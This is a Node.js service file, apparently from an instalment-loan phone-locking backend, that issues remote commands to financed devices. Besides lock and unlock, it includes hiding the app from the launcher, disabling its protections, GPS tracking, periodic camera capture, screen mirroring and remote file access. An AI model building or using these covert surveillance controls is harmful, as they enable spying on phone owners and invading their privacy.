import { Op } from 'sequelize';
import {
  Device, DeviceCommand, EMIContract, EMIPayment,
} from '../models/index.js';
import { FCMService } from './fcmService.js';
import { wakeDevice } from './realtime.js';
import { utcNow } from '../utils/time.js';

/**
 * Device command management — port of CommandService in emi_service.py.
 * Commands are committed optimistically; FCM is fired in the background so the
 * admin request never blocks on the push round-trip.
 */
export const CommandService = {
  async createCommand(device, commandType, payload = {}, userId = null, reason = null) {
    const fields = {
      device_id: device.id,
      command_type: commandType,
      payload: payload || {},
      issued_by: userId,
      reason,
    };

    if (device.fcm_token) {
      fields.status = 'sent';
      fields.sent_at = utcNow();
    } else {
      fields.status = 'pending';
      fields.error_message = 'No FCM token - waiting for device poll';
    }

    const command = await DeviceCommand.create(fields);

    // Instant wake over Socket.IO (device picks the command up immediately).
    try {
      wakeDevice(device.id);
    } catch {
      /* best effort */
    }

    // Background FCM push (non-blocking).
    if (device.fcm_token) {
      FCMService.sendCommand({
        fcmToken: device.fcm_token,
        commandType: String(commandType).toUpperCase(),
        payload: payload || {},
        commandId: String(command.id),
      }).then((messageId) => {
        if (messageId) {
          command.fcm_message_id = messageId;
          command.save().catch(() => {});
        }
      }).catch(() => {});
    }

    return command;
  },

  createLockCommand(device, userId = null, reason = null,
    message = 'Your device has been locked due to pending EMI payment.', contactNumber = '') {
    return this.createCommand(device, 'lock', {
      message, contact_number: contactNumber, allow_emergency: 'true',
    }, userId, reason);
  },

  createUnlockCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'unlock', {}, userId, reason);
  },

  createWarningCommand(device, title, message, dueDate = '', amount = '', userId = null) {
    return this.createCommand(device, 'warning', {
      title, message, due_date: dueDate, amount,
    }, userId, 'Payment reminder');
  },

  createHideAppCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'hide_app', { action: 'hide', hide_from_launcher: true }, userId, reason || 'Admin hide app');
  },

  createUnhideAppCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'unhide_app', { action: 'unhide', hide_from_launcher: false }, userId, reason || 'Admin unhide app');
  },

  createDisableAppCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'disable_app', { action: 'disable', disable_protections: true }, userId, reason || 'Admin disable app');
  },

  createEnableAppCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'enable_app', { action: 'enable', disable_protections: false }, userId, reason || 'Admin enable app');
  },

  createGpsTrackCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'gps_track', { action: 'gps_track', request_location: true }, userId, reason || 'Admin GPS tracking request');
  },

  createCameraOnCommand(device, userId = null, reason = null, camera = 'front') {
    const lens = ['rear', 'back'].includes(String(camera).toLowerCase()) ? 'rear' : 'front';
    return this.createCommand(device, 'camera_on', { action: 'camera_on', capture_interval: '10', camera: lens }, userId, reason || 'Admin camera on');
  },

  createCameraOffCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'camera_off', { action: 'camera_off' }, userId, reason || 'Admin camera off');
  },

  createUninstallAppCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'uninstall_app', { action: 'uninstall', remove_device_owner: true, uninstall_app: true }, userId, reason || 'Admin uninstall app');
  },

  createSetFrpAccountCommand(device, frpAccount, userId = null, reason = null) {
    return this.createCommand(device, 'set_frp_account', { action: 'set_frp_account', frp_account: frpAccount }, userId, reason || `Set FRP account: ${frpAccount}`);
  },

  createStartScreenMirrorCommand(device, quality = 50, fps = 4, scale = 0.5, userId = null, reason = null) {
    const clamp = (v, lo, hi) => Math.max(lo, Math.min(hi, v));
    return this.createCommand(device, 'start_screen_mirror', {
      action: 'start_screen_mirror',
      quality: String(clamp(parseInt(quality, 10) || 50, 1, 100)),
      fps: String(clamp(parseInt(fps, 10) || 4, 1, 15)),
      scale: String(clamp(parseFloat(scale) || 0.5, 0.2, 1.0)),
    }, userId, reason || 'Admin started screen mirroring');
  },

  createStopScreenMirrorCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'stop_screen_mirror', { action: 'stop_screen_mirror' }, userId, reason || 'Admin stopped screen mirroring');
  },

  createStartFileManagerCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'start_file_manager', { action: 'start_file_manager' }, userId, reason || 'Admin opened file manager');
  },

  createStopFileManagerCommand(device, userId = null, reason = null) {
    return this.createCommand(device, 'stop_file_manager', { action: 'stop_file_manager' }, userId, reason || 'Admin closed file manager');
  },

  /** Update command status from a device acknowledgment and sync device state. */
  async acknowledgeCommand(commandId, status, errorMessage = null) {
    const command = await DeviceCommand.findByPk(commandId);
    if (!command) return null;

    command.status = status;
    if (status === 'delivered') {
      command.delivered_at = utcNow();
    } else if (status === 'executed') {
      command.executed_at = utcNow();
      const device = await Device.findByPk(command.device_id);
      if (device) {
        const t = command.command_type;
        if (t === 'lock') device.status = 'locked';
        else if (t === 'unlock') device.status = 'active';
        else if (t === 'hide_app') device.is_app_hidden = true;
        else if (t === 'unhide_app') device.is_app_hidden = false;
        else if (t === 'disable_app') device.is_app_disabled = true;
        else if (t === 'enable_app') device.is_app_disabled = false;
        else if (t === 'camera_on') device.camera_active = true;
        else if (t === 'camera_off') device.camera_active = false;
        await device.save();
      }
    } else if (status === 'failed') {
      command.error_message = errorMessage;
    }

    await command.save();
    return command;
  },
};

export default CommandService;
